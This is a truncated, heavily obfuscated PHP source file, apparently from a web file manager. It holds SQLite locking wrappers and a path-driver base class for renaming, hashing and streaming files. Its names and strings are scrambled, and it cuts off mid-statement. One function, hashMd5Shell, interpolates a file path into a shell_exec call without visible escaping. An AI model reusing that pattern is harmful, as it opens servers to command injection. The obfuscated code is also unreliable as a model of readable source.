$this->query("\123\105\x4c\105\x43\x54\40{$B”´£Ã°åÂ}\56\143\x75\162\162\x76\141\x6c\40\143\x75\162\162\x76\x61\154\x20\x46\x52\117\115\x20\x64\x75\141\x6c"); return $bğ™®ÄØÉ ? $bğ™®ÄØÉ[0][$E×»Â½´[870]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($B×²œª®è) { goto Cˆ³‹°’÷; e‚çËˆÏ°‘: if (!$B´×ö„îÒß) { return !1; } if (flock($B´×ö„îÒß, LOCK_EX)) { $C½ÁÉ´•ˆ = parent::query($B×²œª®è); flock($B´×ö„îÒß, LOCK_UN); fclose($B´×ö„îÒß); return $C½ÁÉ´•ˆ; } flock($B´×ö„îÒß, LOCK_UN); goto AÃ‹óäÆø; AÃ‹óäÆø: fclose($B´×ö„îÒß); show_json($c†ìÁøŞ›Ø[873], !1); return !1; goto aš¹÷…½…œ; Cˆ³‹°’÷: $c†ìÁøŞ›Ø =& $_SERVER[¼€¼ˆ¦‚¡]; $E¨º‹ÊùÑ = DATA_PATH . $c†ìÁøŞ›Ø[871]; $B´×ö„îÒß = fopen($E¨º‹ÊùÑ, $c†ìÁøŞ›Ø[872]); goto e‚çËˆÏ°‘; aš¹÷…½…œ: } public function execute($d²Ë•­Õ¦) { goto Dµƒ“±›ñ; EÃè¬íàù¬: fclose($f±¨Š¸Ââ¦); show_json($cËÈ˜–†Ş×[873], !1); return !1; goto c½ŸÅ¹˜ÃÓ; b«†İ¯Ä½è: if (!$f±¨Š¸Ââ¦) { return !1; } if (flock($f±¨Š¸Ââ¦, LOCK_EX)) { $F„ĞÚË¯ĞØ = parent::execute($d²Ë•­Õ¦); flock($f±¨Š¸Ââ¦, LOCK_UN); fclose($f±¨Š¸Ââ¦); return $F„ĞÚË¯ĞØ; } flock($f±¨Š¸Ââ¦, LOCK_UN); goto EÃè¬íàù¬; Dµƒ“±›ñ: $cËÈ˜–†Ş× =& $_SERVER[¼€¼ˆ¦‚¡]; $EÑöµÇøŞ® = DATA_PATH . $cËÈ˜–†Ş×[871]; $f±¨Š¸Ââ¦ = fopen($EÑöµÇøŞ®, $cËÈ˜–†Ş×[872]); goto b«†İ¯Ä½è; c½ŸÅ¹˜ÃÓ: } } goto CÖõ½Òöİ; Dù­ÜïçÏÕ: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $BÑïã‚–Îõ =& $_SERVER[¼€¼ˆ¦‚¡]; $this->objectDriver = array($BÑïã‚–Îõ[57], $BÑïã‚–Îõ[58], $BÑïã‚–Îõ[59], $BÑïã‚–Îõ[60], $BÑïã‚–Îõ[61], $BÑïã‚–Îõ[62], $BÑïã‚–Îõ[63], $BÑïã‚–Îõ[64]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($BäÑáêŸ§è) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($BäÑáêŸ§è, $_SERVER[¼€¼ˆ¦‚¡][8]); } return $BäÑáêŸ§è; } public function getPathName($A£Êâá§’—) { return $A£Êâá§’—; } public function iconvApp($E®”ƒ±) { return $E®”ƒ±; } public function iconvSystem($AÏ‚Í»Î­) { return $AÏ‚Í»Î­; } public function iconvTo($BÑõ‹ï¦´–, $fóª·¤Úõä, $b‘‹‰è¤¹§) { goto DºÏİ‡ãÀ˜; CìÁî”à: $EÆ·Şöô¾‡ = $EÆ·Şöô¾‡ ? $EÆ·Şöô¾‡ : $BÑõ‹ï¦´–; if (strstr($EÆ·Şöô¾‡, $eßïÁÊ[69])) { $EÆ·Şöô¾‡ = str_replace($eßïÁÊ[69], $eßïÁÊ[70], $EÆ·Şöô¾‡); } $cÈ«ò•°¾[$fóª·¤Úõä . $eßïÁÊ[66] . $b‘‹‰è¤¹§ . $eßïÁÊ[67] . $BÑõ‹ï¦´–] = $EÆ·Şöô¾‡; goto a ¡ò”ôÉ¹; DºÏİ‡ãÀ˜: $eßïÁÊ =& $_SERVER[¼€¼ˆ¦‚¡]; if (!$BÑõ‹ï¦´– || !function_exists($eßïÁÊ[65])) { return $BÑõ‹ï¦´–; } static $cÈ«ò•°¾ = array(); goto d¨»ç¨äË; d¨»ç¨äË: $aÓÎ„Öë = $fóª·¤Úõä . $eßïÁÊ[66] . $b‘‹‰è¤¹§ . $eßïÁÊ[67] . $BÑõ‹ï¦´–; if (isset($cÈ«ò•°¾[$aÓÎ„Öë])) { return $cÈ«ò•°¾[$aÓÎ„Öë]; } if (function_exists($eßïÁÊ[68])) { $EÆ·Şöô¾‡ = @mb_convert_encoding($BÑõ‹ï¦´–, $b‘‹‰è¤¹§, $fóª·¤Úõä); } else { $EÆ·Şöô¾‡ = @iconv($fóª·¤Úõä, $b‘‹‰è¤¹§, $BÑõ‹ï¦´–); } goto CìÁî”à; aÏŠƒŒµ¾…: return $EÆ·Şöô¾‡; goto Eİ˜Öïì‘—; a ¡ò”ôÉ¹: $cÈ«ò•°¾[$b‘‹‰è¤¹§ . $eßïÁÊ[66] . $fóª·¤Úõä . $eßïÁÊ[67] . $BÑõ‹ï¦´–] = $BÑõ‹ï¦´–; $cÈ«ò•°¾[$b‘‹‰è¤¹§ . $eßïÁÊ[66] . $fóª·¤Úõä . $eßïÁÊ[67] . $EÆ·Şöô¾‡] = $BÑõ‹ï¦´–; $cÈ«ò•°¾[$fóª·¤Úõä . $eßïÁÊ[66] . $b‘‹‰è¤¹§ . $eßïÁÊ[67] . $EÆ·Şöô¾‡] = $EÆ·Şöô¾‡; goto aÏŠƒŒµ¾…; Eİ˜Öïì‘—: } public function getPathInner($CÖëŒ¶ÂÇ) { $Bğ¹æ’¶„ = IO::init($CÖëŒ¶ÂÇ); return $Bğ¹æ’¶„->path; } public function getPathOuter($fá“¬§Êø) { $dö£ŞÔÔãÅ =& $_SERVER[¼€¼ˆ¦‚¡]; $A²Ö…º¯æ = strlen(trim($this->pathBase, $dö£ŞÔÔãÅ[8])); $fá“¬§Êø = substr(trim($fá“¬§Êø, $dö£ŞÔÔãÅ[8]), $A²Ö…º¯æ); return $this->pathDriver . $dö£ŞÔÔãÅ[8] . ltrim($fá“¬§Êø, $dö£ŞÔÔãÅ[8]); } public function isParentOf($e„¤Ç‹ÉÙ, $FáîÓìò¡¢) { $c·­œŸ¤º =& $_SERVER[¼€¼ˆ¦‚¡]; $e„¤Ç‹ÉÙ = rtrim(strtolower($e„¤Ç‹ÉÙ), $c·­œŸ¤º[8]) . $c·­œŸ¤º[8]; $FáîÓìò¡¢ = rtrim(strtolower($FáîÓìò¡¢), $c·­œŸ¤º[8]) . $c·­œŸ¤º[8]; $d×›ÖÓâ = strpos($FáîÓìò¡¢, $e„¤Ç‹ÉÙ) === 0; return $d×›ÖÓâ; } public function getType() { $F“Ç‹­«‰Î =& $_SERVER[¼€¼ˆ¦‚¡]; $a„ƒ­§¬âŒ = str_replace($F“Ç‹­«‰Î[71], $F“Ç‹­«‰Î[33], get_class($this)); return strtolower($a„ƒ­§¬âŒ); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($dÌ¸ñËšæ¼, $bŞ…Ï‘È’) { $BœĞ÷Ì·ê¹ =& $_SERVER[¼€¼ˆ¦‚¡]; $f«ñ›äÕğ = rtrim($dÌ¸ñËšæ¼, $BœĞ÷Ì·ê¹[8]) . $BœĞ÷Ì·ê¹[8] . $bŞ…Ï‘È’; $dÖ•î¨Ï¡ = $this->exist($f«ñ›äÕğ); return $dÖ•î¨Ï¡ ? $f«ñ›äÕğ : !1; } public function setModifyTime($C½ŸÀÙª£, $f‚ø„Æå×î = '') { } public function renameObject($FšÅœååèé, $E¬Îø†ñ°Ÿ) { goto Açõ–†ïéº; eÕ– Ù§×: return $DÆÂãõß ? $E¬Îø†ñ°Ÿ : !1; goto aÑµ„‡Ë«÷; Açõ–†ïéº: $b±Ú©ãê =& $_SERVER[¼€¼ˆ¦‚¡]; $fÓäÃ±è¹Æ = $E¬Îø†ñ°Ÿ; Hook::trigger($b±Ú©ãê[72], $this, $FšÅœååèé, $this, $this->pathFather($FšÅœååèé) . $E¬Îø†ñ°Ÿ); goto cï«²Ô‚§; cï«²Ô‚§: $FšÅœååèé = $this->getPathOuter($FšÅœååèé); $E¬Îø†ñ°Ÿ = $this->pathFather($FšÅœååèé) . $E¬Îø†ñ°Ÿ; if (IO::isFile($FšÅœååèé)) { $DÆÂãõß = IO::copy($FšÅœååèé, $this->pathFather($FšÅœååèé), REPEAT_RENAME_FOLDER, $fÓäÃ±è¹Æ); if ($DÆÂãõß) { IO::remove($FšÅœååèé); } } else { $DÆÂãõß = IO::mkdir($E¬Îø†ñ°Ÿ); if (!$DÆÂãõß) { return !1; } $b¡ÈÕ¹²“× = IO::listPath($FšÅœååèé, !0); $b¸…¥«‘ªö = array_merge($b¡ÈÕ¹²“×[$b±Ú©ãê[73]], $b¡ÈÕ¹²“×[$b±Ú©ãê[74]]); foreach ($b¸…¥«‘ªö as $dÂ¶İîºÇ×) { IO::move($dÂ¶İîºÇ×[$b±Ú©ãê[75]], $E¬Îø†ñ°Ÿ, REPEAT_RENAME_FOLDER); } IO::remove($FšÅœååèé); } goto eÕ– Ù§×; aÑµ„‡Ë«÷: } public function tempFile($d®­Š›Ş = '', $A»•à÷ä¼÷ = '') { goto Bƒ¸Ö¯çÜà; AÃê„…ßëÚ: $A´‚«åÀÓ = $BÍÆÙ¬ç . $d®­Š›Ş; @touch($A´‚«åÀÓ); if ($A»•à÷ä¼÷) { file_put_contents($A´‚«åÀÓ, $A»•à÷ä¼÷); } goto c˜ª³¸á»¾; c˜ª³¸á»¾: return $A´‚«åÀÓ; goto CŠğòğ‰„; Bƒ¸Ö¯çÜà: if (!$d®­Š›Ş) { $d®­Š›Ş = rand_string(15); } $BÍÆÙ¬ç = TEMP_FILES . rand_string(15) . $_SERVER[¼€¼ˆ¦‚¡][8]; @mkdir($BÍÆÙ¬ç, 511, !0); goto AÃê„…ßëÚ; CŠğòğ‰„: } public function tempFileRemve($B‡ãäÓ‘ÃÌ) { @unlink($B‡ãäÓ‘ÃÌ); @rmdir($this->pathFather($B‡ãäÓ‘ÃÌ)); } public function mkfile($Dˆ³±ã²´À, $E’ºøæ¹„Ä = '', $aå·é•ìÎ¨ = REPEAT_RENAME) { } public function mkdir($aÅí‡ö±½, $CÏèñàÀä· = REPEAT_SKIP) { } public function delFile($fîóÜ†¨«·) { } public function delFolder($CÌ·ñİ£„Ñ) { } public function copyFile($e±êõ¡†ãÉ, $AæãºàİË­) { } public function moveFile($fãˆ”ÓÒùø, $FğùÈ¦”Ç) { } public function remove($BĞÊ˜İµ©§) { if ($this->isFile($BĞÊ˜İµ©§)) { return $this->delFile($BĞÊ˜İµ©§); } return $this->delFolder($BĞÊ˜İµ©§); } public function rename($DĞâ„¶»Ñ, $böˆŸø‡ÍŒ) { } public function exist($bĞÀ©è¨¦•) { } public function findByHash($bŞÅ˜¬Ü÷× = '', $cº©ƒ‘ä¸À = '') { return !1; } public function isFile($dîƒ‚«§) { } public function isFolder($CßõØ…áÇ) { } public function size($c¤ÛéÎİ“) { } public function info($E¹á…«êéğ) { } public function infoSimple($AÕ¶øâ•èö) { return $this->info($AÕ¶øâ•èö); } public function infoAuth($f¥‹«âê¿¸) { return $this->info($f¥‹«âê¿¸); } public function infoFull($EÑ­¢õÒ’Ò) { return $this->info($EÑ­¢õÒ’Ò); } public function infoWithChildren($Fµ†ÄˆóĞĞ) { $FùñìšÖŠ =& $_SERVER[¼€¼ˆ¦‚¡]; static $D‰›ğ¾ßä = array(); if (isset($D‰›ğ¾ßä[$Fµ†ÄˆóĞĞ])) { return $D‰›ğ¾ßä[$Fµ†ÄˆóĞĞ]; } $f÷Ï’ÂŞº = $this->info($Fµ†ÄˆóĞĞ); if ($f÷Ï’ÂŞº && $f÷Ï’ÂŞº[$FùñìšÖŠ[29]] == $FùñìšÖŠ[76]) { $F‰­Öƒã±‘ = array($FùñìšÖŠ[77] => 0, $FùñìšÖŠ[78] => 0, $FùñìšÖŠ[79] => 0); $this->infoChildren($Fµ†ÄˆóĞĞ, $F‰­Öƒã±‘); $f÷Ï’ÂŞº[$FùñìšÖŠ[77]] = $F‰­Öƒã±‘[$FùñìšÖŠ[77]]; $f÷Ï’ÂŞº[$FùñìšÖŠ[80]] = array($FùñìšÖŠ[81] => $F‰­Öƒã±‘[$FùñìšÖŠ[78]], $FùñìšÖŠ[82] => $F‰­Öƒã±‘[$FùñìšÖŠ[79]]); $D‰›ğ¾ßä[$Fµ†ÄˆóĞĞ] = $f÷Ï’ÂŞº; } return $f÷Ï’ÂŞº; } public function listPath($BØÈ¸ä´Ñ, $F†”Íõ•ø† = false) { } public function has($c¾©‹¹âß¼, $cŒ§‹Íñ”õ = false, $AÓÍøÖ‹È = false) { } public function canRead($Aà‘”©“ñ¬) { } public function canWrite($BÕ¸Ö©¹) { } public function getContent($AÓ‹œ³·àĞ) { } public function setContent($Fİ£±ºòŒ, $EÁĞÅ‰–‰ì = '') { } protected function infoChildren($f”–ìÚàÅª, &$D‰àµÂß‹¬) { $d›öËÙ£ê =& $_SERVER[¼€¼ˆ¦‚¡]; check_abort(); $eâ°‘Ñì×‘ = $this->listPath($f”–ìÚàÅª, !0); $eâ°‘Ñì×‘ = array_merge($eâ°‘Ñì×‘[$d›öËÙ£ê[74]], $eâ°‘Ñì×‘[$d›öËÙ£ê[73]]); foreach ($eâ°‘Ñì×‘ as $BÚñƒåâİä) { if ($BÚñƒåâİä[$d›öËÙ£ê[29]] == $d›öËÙ£ê[76]) { $D‰àµÂß‹¬[$d›öËÙ£ê[79]]++; $e™”¤±×ĞÌ = $this->getPathInner($BÚñƒåâİä[$d›öËÙ£ê[75]]); $this->infoChildren($e™”¤±×ĞÌ, $D‰àµÂß‹¬); } else { $D‰àµÂß‹¬[$d›öËÙ£ê[78]]++; $D‰àµÂß‹¬[$d›öËÙ£ê[77]] += $BÚñƒåâİä[$d›öËÙ£ê[77]]; } } } public function fileSubstr($bî±«ÜÒ®‘, $Bì¦Š¢çˆÂ, $C·Ó±„÷Ò) { } public function listAll($dš¡Ì“Š›ê) { } public function upload($BÜ©¡Áğ¶Ş, $c¼¹Ì‹è², $eÁ¼³âìë‰ = false, $b–òéÕñ²ñ = REPEAT_REPLACE) { } public function uploadFileByID($E„­‰®ßÍğ, $dÔ¬’·š•, $a¦Í“ÅªÀå) { } public function uploadFileByPath($EòÜ¤‰çô, $d¼”—áÕ¸Ü, $dÖ¸ˆ„ù = array()) { } public function isUploadServer() { $DÍ·…Ãì¾² =& $_SERVER[¼€¼ˆ¦‚¡]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $DÍ·…Ãì¾²[83]) { return !0; } return $GLOBALS[$DÍ·…Ãì¾²[6]][$DÍ·…Ãì¾²[84]][$DÍ·…Ãì¾²[85]]; } public function isFileOutServer() { $DÛ¬ÒÆ‚‡ò =& $_SERVER[¼€¼ˆ¦‚¡]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $DÛ¬ÒÆ‚‡ò[83]) { return !0; } return $GLOBALS[$DÛ¬ÒÆ‚‡ò[6]][$DÛ¬ÒÆ‚‡ò[84]][$DÛ¬ÒÆ‚‡ò[86]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($c¼å½Œ¥íî) { $bÆ¼¥Øš†ã =& $_SERVER[¼€¼ˆ¦‚¡]; if (!$this->isCdnHost()) { return $c¼å½Œ¥íî; } return str_replace(trim(get_url_root($c¼å½Œ¥íî), $bÆ¼¥Øš†ã[8]), trim($this->cdnHost, $bÆ¼¥Øš†ã[8]), $c¼å½Œ¥íî); } public function uploadLink($dšìÙ½Şé, $e†ò–´„İµ = 0) { goto eï¯˜ªÅÑ; aìÖÇ…à÷³: if ($f‹‰äÍîÚ) { $f‹‰äÍîÚ[$bÏ×Öêí°—[89]] = $dšìÙ½Şé; $f‹‰äÍîÚ[$bÏ×Öêí°—[90]] = $F¸¹ÙæÀøÌ; } return $f‹‰äÍîÚ; goto a¾ØÃÌ; eï¯˜ªÅÑ: $bÏ×Öêí°— =& $_SERVER[¼€¼ˆ¦‚¡]; if ($this->isUploadServer()) { return; } $F¸¹ÙæÀøÌ = $this->getType(); goto bŞÕ‡®¨•; c‘’ŠÆ³åó: $f¥™ŠØ§ë = $e†ò–´„İµ <= $AÉ†‡‹äå ? $bÏ×Öêí°—[87] : $bÏ×Öêí°—[88]; $E‘©êÆ ´Ş = (!$e†ò–´„İµ ? 1 : ceil($e†ò–´„İµ / pow(1024, 3))) * 3600 * 4; $f‹‰äÍîÚ = $this->{$f¥™ŠØ§ë}($dšìÙ½Şé, $E‘©êÆ ´Ş); goto aìÖÇ…à÷³; bŞÕ‡®¨•: if (!in_array($F¸¹ÙæÀøÌ, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $AÉ†‡‹äå = 1024 * 1024 * 10; goto c‘’ŠÆ³åó; a¾ØÃÌ: } public function uploadFormData($eŸ“°ŠÚ, $A““ˆñÙî = 3600) { } public function multiUploadFormData($b´¶‘‡ìî, $EÈØ›½Ü¾ï = 3600) { } public function download($Dç¸éÙ©”…, $F„äÓƒ£·¬) { } public function ext($DàÄÉÖÀõ) { $F”‡§¶»Ôâ =& $_SERVER[¼€¼ˆ¦‚¡]; if (strpos($DàÄÉÖÀõ, $F”‡§¶»Ôâ[8]) === -1) { $C›øå…Í·¶ = $DàÄÉÖÀõ; } else { $C›øå…Í·¶ = $this->pathThis($DàÄÉÖÀõ); } $a¿‹×›Œ¯ó = $F”‡§¶»Ôâ[33]; if (strstr($C›øå…Í·¶, $F”‡§¶»Ôâ[91])) { $a¿‹×›Œ¯ó = substr($C›øå…Í·¶, strrpos($C›øå…Í·¶, $F”‡§¶»Ôâ[91]) + 1); $a¿‹×›Œ¯ó = strtolower($a¿‹×›Œ¯ó); } if (strlen($a¿‹×›Œ¯ó) > 3 && preg_match($F”‡§¶»Ôâ[92], $a¿‹×›Œ¯ó, $B÷ÏŠÜÈõ)) { $a¿‹×›Œ¯ó = $F”‡§¶»Ôâ[33]; } return $a¿‹×›Œ¯ó; } public function pathThis($BÈ—ğ†ßçé) { $BÃ´œÆŠ‚ =& $_SERVER[¼€¼ˆ¦‚¡]; $BÈ—ğ†ßçé = str_replace($BÃ´œÆŠ‚[93], $BÃ´œÆŠ‚[8], rtrim($BÈ—ğ†ßçé, $BÃ´œÆŠ‚[8])); $B™ªµáÀòò = strrpos($BÈ—ğ†ßçé, $BÃ´œÆŠ‚[8]); if ($B™ªµáÀòò === !1) { return $BÈ—ğ†ßçé; } return substr($BÈ—ğ†ßçé, $B™ªµáÀòò + 1); } public function pathFather($aÍ‡‰Œ‹é) { $fÍ¶Ÿµ™Œè =& $_SERVER[¼€¼ˆ¦‚¡]; $aÍ‡‰Œ‹é = str_replace($fÍ¶Ÿµ™Œè[93], $fÍ¶Ÿµ™Œè[8], rtrim($aÍ‡‰Œ‹é, $fÍ¶Ÿµ™Œè[8])); $B®¢°­Š = strrpos($aÍ‡‰Œ‹é, $fÍ¶Ÿµ™Œè[8]); if ($B®¢°­Š === !1) { return $fÍ¶Ÿµ™Œè[33]; } return substr($aÍ‡‰Œ‹é, 0, $B®¢°­Š + 1); } public function hashSimple($EâÊ®«á°÷) { goto FÉ’ìøçù; e‰Ï‚ô˜»³: $bÕ×ê±‘¼¿ = 200; $aëœÔ“²× = 50; if ($B½òÎäŒ¿Å <= $bÕ×ê±‘¼¿ * $aëœÔ“²×) { return $this->hashMd5($EâÊ®«á°÷) . $B½òÎäŒ¿Å; } goto A×‰‰…ù’; c¿¹éÇÕÒ³: $EÑİ¡¹ˆ–ƒ .= $this->fileSubstr($EâÊ®«á°÷, $B½òÎäŒ¿Å - $bÕ×ê±‘¼¿, $bÕ×ê±‘¼¿); return md5($EÑİ¡¹ˆ–ƒ) . $B½òÎäŒ¿Å; goto bÍÓÌÙˆøÖ; FÉ’ìøçù: $E£…––©¯â =& $_SERVER[¼€¼ˆ¦‚¡]; if (!$EâÊ®«á°÷) { return md5($E£…––©¯â[33]); } $B½òÎäŒ¿Å = $this->size($EâÊ®«á°÷); goto e‰Ï‚ô˜»³; A×‰‰…ù’: $E­¥ÄÆ™ï = intval($B½òÎäŒ¿Å / $aëœÔ“²×); $EÑİ¡¹ˆ–ƒ = $E£…––©¯â[33]; for ($bÒøÕ¾÷ = 0; $bÒøÕ¾÷ < $aëœÔ“²×; $bÒøÕ¾÷++) { $EÑİ¡¹ˆ–ƒ .= $this->fileSubstr($EâÊ®«á°÷, $E­¥ÄÆ™ï * $bÒøÕ¾÷, $bÕ×ê±‘¼¿); } goto c¿¹éÇÕÒ³; bÍÓÌÙˆøÖ: } public static $md5Cache = array(); public function hashMd5($DÍÁó¡ÓÉá) { $DÍÁó¡ÓÉá = $this->iconvSystem($DÍÁó¡ÓÉá); if (isset(self::$md5Cache[$DÍÁó¡ÓÉá])) { return self::$md5Cache[$DÍÁó¡ÓÉá]; } self::$md5Cache[$DÍÁó¡ÓÉá] = $this->hashMd5Shell($DÍÁó¡ÓÉá); if (!self::$md5Cache[$DÍÁó¡ÓÉá]) { self::$md5Cache[$DÍÁó¡ÓÉá] = @md5_file($DÍÁó¡ÓÉá); } return self::$md5Cache[$DÍÁó¡ÓÉá]; } private function hashMd5Shell($cŞåİæ¼æø) { goto BÎæ¨‚¼ñ ; C‰Ë­¹˜†: $AØíÊí‚‰ = shell_exec($fĞğÄ¶Ëùó . "\40\x22{$cŞåİæ¼æø}\42"); $AØíÊí‚‰ = str_replace($d¬ŸíİÑ±¥[100], $d¬ŸíİÑ±¥[33], $AØíÊí‚‰); return substr($AØíÊí‚‰, 0, 32); goto aÉ‹ê‚…”; cªƒ“ç‡: $fĞğÄ¶Ëùó = Cache::get($d¬ŸíİÑ±¥[97]); if (!$fĞğÄ¶Ëùó) { $AØìø‹æøï = BASIC_PATH . $d¬ŸíİÑ±¥[98]; $F†ñİ¼ = md5_file($AØìø‹æøï); $fĞğÄ¶Ëùó = $d¬ŸíİÑ±¥[99]; foreach ($d¥æ“¿éµ as $e‚¥¦¸ÃØñ) { $AØíÊí‚‰ = shell_exec($e‚¥¦¸ÃØñ . "\x20\x22{$AØìø‹æøï}\42"); if ($AØíÊí‚‰ && substr(trim($AØíÊí‚‰), 0, 32) == $F†ñİ¼) { $fĞğÄ¶Ëùó = $e‚¥¦¸ÃØñ; break; } } Cache::set($d¬ŸíİÑ±¥[97], $fĞğÄ¶Ëùó, 3600); } if ($fĞğÄ¶Ëùó == $d¬ŸíİÑ±¥[99]) { return !1; } goto C‰Ë­¹˜†; BÎæ¨‚¼ñ : $d¬ŸíİÑ±¥ =& $_SERVER[¼€¼ˆ¦‚¡]; if (!function_exists($d¬ŸíİÑ±¥[94])) { return !1; } $d¥æ“¿éµ = array($d¬ŸíİÑ±¥[95], $d¬ŸíİÑ±¥[96]); goto cªƒ“ç‡; aÉ‹ê‚…”: } public function link($dğĞëØç™Ó) { return $dğĞëØç™Ó; } public function fileOut($DĞœ‹ˆÃî˜, $E¢ö•Ò¼šò = false, $c“•ˆ—¨¦˜ = false, $A­ÆøëŸ½§ = '') { goto C–Ô¨Ğôë; Díà™«Ö•: if (isset($_SERVER[$c ¥°·™ê[128]]) && strtotime($_SERVER[$c ¥°·™ê[128]]) == $f¡ßÉÉÄŒ‰[$c ¥°·™ê[107]]) { header($c ¥°·™ê[129], !0, 304); die; } if (isset($_SERVER[$c ¥°·™ê[130]]) && $_SERVER[$c ¥°·™ê[130]] == $A­ÆøëŸ½§) { header($c ¥°·™ê[131] . $A­ÆøëŸ½§, !0, 304); die; } header($c ¥°·™ê[131] . $A­ÆøëŸ½§); goto e²…»šçã·; eÑİÜŸ£„: if ($_SERVER[$c ¥°·™ê[154]] == $c ¥°·™ê[155]) { return; } $fí‚³‰äÃ“ = 1024 * 100; $c½Ù¤˜Ş¹’ = 0; goto CÖÚµî¾‘À; CÖÚµî¾‘À: if ($AÙ”ÂÊ¥ğ) { $c½Ù¤˜Ş¹’ = intval(1000 * 1000 * ($fí‚³‰äÃ“ / $AÙ”ÂÊ¥ğ)); } while ($cßÖ•øÆ”Õ <= $a•½ù÷õÓ‡) { $DƒèÍí¤Î = timeFloat(); check_abort(); $fé¨á²÷–„ = $a•½ù÷õÓ‡ - $cßÖ•øÆ”Õ + 1; if ($fé¨á²÷–„ <= $fí‚³‰äÃ“) { $fí‚³‰äÃ“ = $fé¨á²÷–„; } echo $this->fileSubstr($DĞœ‹ˆÃî˜, $cßÖ•øÆ”Õ, $fí‚³‰äÃ“); $cßÖ•øÆ”Õ += $fí‚³‰äÃ“; if ($fí‚³‰äÃ“ == $fé¨á²÷–„) { $cßÖ•øÆ”Õ = $a•½ù÷õÓ‡ + 1; } if ($c½Ù¤˜Ş¹’) { $CÑöƒè˜°Ò = intval(1000 * 1000 * (timeFloat() - $DƒèÍí¤Î)); $DÓ·ö—Ôœ‘ = $c½Ù¤˜Ş¹’ - $CÑöƒè˜°Ò; if ($DÓ·ö—Ôœ‘ > 5) { usleep($DÓ·ö—Ôœ‘); } } } goto c„™òù˜ˆœ; eãŒÃ…†áŒ: if (in_array($F¯½¨†Ö‡â, array($c ¥°·™ê[108], $c ¥°·™ê[109], $c ¥°·™ê[110], $c ¥°·™ê[111]))) { $F¯½¨†Ö‡â = $c ¥°·™ê[112]; } if (!$A­ÆøëŸ½§) { $A­ÆøëŸ½§ = md5($BÊ¸£çÜ• . $this->hashSimple($DĞœ‹ˆÃî˜)); } $A­ÆøëŸ½§ = $c ¥°·™ê[113] . $A­ÆøëŸ½§ . $c ¥°·™ê[113]; goto cÄ‚êñÓ§; CÊøç÷ˆäÁ: $AØ·‡ÎÓçÃ = !0; if ($_SERVER[$c ¥°·™ê[151]] == $c ¥°·™ê[152] && $dØ’øœôä™ > 1204 * 1024 * 1024 * 2) { $AØ·‡ÎÓçÃ = !1; } if ($AØ·‡ÎÓçÃ) { header($c ¥°·™ê[153] . ($a•½ù÷õÓ‡ - $cßÖ•øÆ”Õ + 1)); } goto eÑİÜŸ£„; aÎ¢ÌïÉÉ«: header($c ¥°·™ê[135] . $dØ’øœôä™); header($c ¥°·™ê[136]); if (!$E¢ö•Ò¼šò && $F¯½¨†Ö‡â == $c ¥°·™ê[137]) { if ($dØ’øœôä™ > 1024 * 1024 * 5) { die; } $FÑ§ãÈĞ‡ = $this->getContent($DĞœ‹ˆÃî˜); $FÑ§ãÈĞ‡ = Html::clearSVG($FÑ§ãÈĞ‡); header($c ¥°·™ê[138] . $dØ’øœôä™); echo $FÑ§ãÈĞ‡; die; } goto bìçĞñíå; cÄ‚êñÓ§: $cÃáÖÏ„´ = get_file_mime($F¯½¨†Ö‡â); if (strstr($cÃáÖÏ„´, $c ¥°·™ê[114])) { $cÃáÖÏ„´ = $cÃáÖÏ„´ . $c ¥°·™ê[115]; } if ($E¢ö•Ò¼šò === !1 && !mime_support($cÃáÖÏ„´)) { $E¢ö•Ò¼šò = !0; $cÃáÖÏ„´ = $c ¥°·™ê[116]; } goto DÑ”ˆ¯òõ…; E˜Ÿ£›Ğõ‘: header($c ¥°·™ê[125]); header($c ¥°·™ê[126]); header($c ¥°·™ê[127]); goto Díà™«Ö•; dß¬§Ã”: $dØ’øœôä™ = $f¡ßÉÉÄŒ‰[$c ¥°·™ê[77]]; $BÊ¸£çÜ• = gmdate($c ¥°·™ê[106], $f¡ßÉÉÄŒ‰[$c ¥°·™ê[107]]); $A•Ïµ¢Ñİ» = $c“•ˆ—¨¦˜ ? $c“•ˆ—¨¦˜ : $this->iconvApp($f¡ßÉÉÄŒ‰[$c ¥°·™ê[28]]); goto D¿»ŞÓÅÌ; D¿»ŞÓÅÌ: $cßÖ•øÆ”Õ = 0; $a•½ù÷õÓ‡ = $dØ’øœôä™ - 1; $F¯½¨†Ö‡â = $this->ext($A•Ïµ¢Ñİ»); goto eãŒÃ…†áŒ; DÎ´ŒÁï°¿: header($c ¥°·™ê[121]); header($c ¥°·™ê[122] . $cÃáÖÏ„´); header($c ¥°·™ê[123] . gmdate($c ¥°·™ê[106], time() + 3600 * 24 * 30) . $c ¥°·™ê[124]); goto E˜Ÿ£›Ğõ‘; BÑÇ¡ô¯“: @ob_end_clean(); set_timeout(); $f¡ßÉÉÄŒ‰ = $this->infoFull($DĞœ‹ˆÃî˜); goto dß¬§Ã”; bìçĞñíå: $Eä·‹äö×á = strtolower($_SERVER[$c ¥°·™ê[139]]); if ($FÅâ ëí && $Eä·‹äö×á && $A£Ë­´ø¬Á) { if (strstr($Eä·‹äö×á, $c ¥°·™ê[140])) { header($c ¥°·™ê[141] . $DĞœ‹ˆÃî˜); } else { if (strstr($Eä·‹äö×á, $c ¥°·™ê[142])) { header($c ¥°·™ê[143] . $DĞœ‹ˆÃî˜); } else { if (strstr($Eä·‹äö×á, $c ¥°·™ê[144])) { header($c ¥°·™ê[145] . $DĞœ‹ˆÃî˜); } } } if ($AÙ”ÂÊ¥ğ) { header($c ¥°·™ê[146] . $AÙ”ÂÊ¥ğ); } return; } if (isset($_SERVER[$c ¥°·™ê[147]])) { if (preg_match($c ¥°·™ê[148], $_SERVER[$c ¥°·™ê[147]], $aí¿Ç®Ã§)) { $cßÖ•øÆ”Õ = intval($aí¿Ç®Ã§[1]); if (!empty($aí¿Ç®Ã§[2])) { $a•½ù÷õÓ‡ = intval($aí¿Ç®Ã§[2]); } } header($c ¥°·™ê[149]); header("\103\x6f\156\164\145\156\164\55\x52\141\156\x67\x65\72\x20\142\x79\164\x65\x73\x20{$cßÖ•øÆ”Õ}\x2d{$a•½ù÷õÓ‡}\57" . 